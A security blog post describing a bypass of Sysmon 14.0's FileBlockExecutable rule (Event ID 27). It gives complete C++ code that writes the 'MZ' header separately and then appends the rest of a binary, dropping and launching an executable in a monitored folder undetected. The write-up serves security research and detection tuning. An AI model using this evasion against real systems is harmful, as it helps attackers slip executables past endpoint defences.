---
layout: article
title: "Sysmon EID 27 Bypass" 
categories: [Cybersecurity]
author: Ahmed Elmayyah
tags: [Cybersecurity, Programming, C, Exploitation]
mode: normal 
header:
  theme: dark
article_header:
  type: cover 
  theme: dark
  background_image: false
# Stick to an image with a height of 700
  image:
    src: /assets/images/sysmon-eid-27-bypass/sysmon_header.jpg
cover: /assets/images/sysmon-eid-27-bypass/sysmon_cover.jpg
---

# Sysmon EID 27 

Sysmon version 14.0 was released on the 16th of August 2022. The new version introduces a new Event ID: 27 FileBlockExecutable. It is kind of new for sysmon to block something from happening completely. So, it was interesting to think of a way to bypass it!

I came across [this post by Olaf Hartong](https://medium.com/@olafhartong/sysmon-14-0-fileblockexecutable-13d7ba3dff3e). In this post, Olaf was previewing the new event and how it works on a surface level.
<!--more-->
> The same is true for an DLL/XLL/WLL file since that will share the same MZ header.

It seemed apparent that the new rule is using the MZ header(explained below) to detect if the file is a Windows executable or not.

# Preparation

Taking the simple config file from the post for demonstration purposes, I installed Sysmon 14.0 on my Windows 10 VM and set the config file below. The file basically sets the rule to fire on any executable file in the Downloads folder of any user.
```xml
<Sysmon schemaversion="4.82">
   <EventFiltering>
      <RuleGroup name="" groupRelation="or">
         <FileBlockExecutable onmatch="include">
            <TargetFilename condition="contains all">C:\Users;Downloads</TargetFilename>
         </FileBlockExecutable>
      </RuleGroup>
   </EventFiltering>
</Sysmon>
```

I also wrote a very simple executable which prints out "Catch me if you can, Sysmon!". This is the executable that I'm going to try to drop and run from the Downloads folder. This executable as a start is placed in Documents\App.exe.

In an actual attack scenario, the file would be recieved from a remote server or perhaps embedded in the file itself. But this is for demonstration only so it shouldn't really matter as Sysmon doesn't care where the file originated. All it cares about is the writing of an executable to the specified folders.
{:.info}


{: style="text-align:center"} 
![Output of the program](/assets/images/sysmon-eid-27-bypass/App.exe.png)

I also opened the event viewer and set a filter for event 27 at Application and Services Logs/Microsoft/Windows/Sysmon/Operational.

{: style="text-align:center"}
![Sysmon Filter](/assets/images/sysmon-eid-27-bypass/SysmonFilter.png)


To verify that Sysmon is working and will detect attempts to write an executable in the Downloads folder, I used the following simple program to write the file.

```cpp
#include <Windows.h>

int main()
{
	//Open an existing executable, for demonstration purposes
	HANDLE executableFile = CreateFileA("C:\\Users\\Satharus\\Documents\\App.exe",
		GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	//Allocate a buffer for the file and read it
	unsigned long long fileSize = GetFileSize(executableFile, NULL);
	char *fileBytes = (char *)malloc(fileSize);
	unsigned int bytesRead;
	ReadFile(executableFile, fileBytes, fileSize, (LPDWORD)&bytesRead, NULL);
	CloseHandle(executableFile);

	//Create a new file with write permissions
	HANDLE downloadsFile = CreateFileA("C:\\Users\\Satharus\\Downloads\\App.notexe",
		GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//Write the executable file
	WriteFile(downloadsFile, fileBytes, fileSize, NULL, NULL);
	return 0;
}
```


{: style="text-align:center"}
![Sysmon Filter](/assets/images/sysmon-eid-27-bypass/WithoutBypass.png)
{: style="text-align:center"}
As expected, Sysmon detects the creation of the file and blocks it.


# The Bypass

## A little bit of background
If you don't know, file formats typically have a [sequence of bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) known as file signatures, file headers, or more commonly, Magic Bytes. They're used by operating systems and programs to detect file formats even if their names don't contain the file extension.

The Windows Portable Executable format uses a file header/signature of MZ (the bytes 4D and 5A). That includes all executables, including .exe, .dll, .sys, etc...

## Primal instinct
My very first thought was to zero out the MZ header and try to execute the file as is. That way Sysmon wouldn't detect it but I'd still be able to execute it just fine. However, that failed as `CreateProcess()` failed to execute a binary that doesn't have an MZ header. Running the executable from PowerShell or the command line prompt didn't work either. Interestingly enough, this proved some points:
 - Sysmon relied on the MZ header to detect an executable, as writing an entire binary without "MZ" worked just fine. 
 - Sysmon doesn't rely on the bytes "MZ" alone as when writing those to a file it doesn't detect anything.


So it seems like Sysmon relies on "MZ" alongside _something_ else to detect that it is an executable.

## The Actual bypass
Puting two and two together, what if we just wrote the file on two stages. We can write the string "MZ" first, and then write the rest of the file.

At first, I tried making two different calls to `WriteFile()` using the same file handle obtained from `CreateFileA()`. Sysmon was able to detect and block that just fine. However, the following steps worked:
 1. Create a file
 2. Write "MZ" to the file
 3. Close the handle to the file
 4. Open a handle to the same file in append mode
 5. Append the rest of the content to the file (make sure to skip the first two bytes)
 6. Close the handle
 7. Profit??

```cpp
#include <Windows.h>

int main()
{
	//Open an existing executable, for demonstration purposes
	HANDLE executableFile = CreateFileA("C:\\Users\\Satharus\\Documents\\App.exe",
		GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	//Allocate a buffer for the file and read it
	unsigned long long fileSize = GetFileSize(executableFile, NULL);
	char *fileBytes = (char *)malloc(fileSize);
	unsigned int bytesRead;
	ReadFile(executableFile, fileBytes, fileSize, (LPDWORD)&bytesRead, NULL);
	CloseHandle(executableFile);

	//Create a new file with write permissions to write the MZ header
	HANDLE downloadsFile = CreateFileA("C:\\Users\\Satharus\\Downloads\\App.notexe",
		GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//Write the MZ header
	WriteFile(downloadsFile, "MZ", 2, NULL, NULL);

	//Close the file, this is extremely necessary to bypass sysmon
	CloseHandle(downloadsFile);

	//Get a handle to the file in append mode to write the rest of the file
	downloadsFile = CreateFileA("C:\\Users\\Satharus\\Downloads\\App.notexe",
		FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	//Write the rest of the file, skipping the first two bytes of the file
	WriteFile(downloadsFile, fileBytes + 2, fileSize - 2, NULL, NULL);
	CloseHandle(downloadsFile);

	//Create a new process using the executable we just very _stealthily_ dropped!
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CreateProcessA("C:\\Users\\Satharus\\Downloads\\App.notexe", NULL,
		NULL, NULL, true, 0, NULL, NULL, &si, &pi);
	return 0;
}
```

This worked flawlessly. 

Simple? Yes. 

Stupid? Probably. 

Effective? Definitely!


Thanks a lot for reading! As usual, I hope you learned something or at least found it interesting!
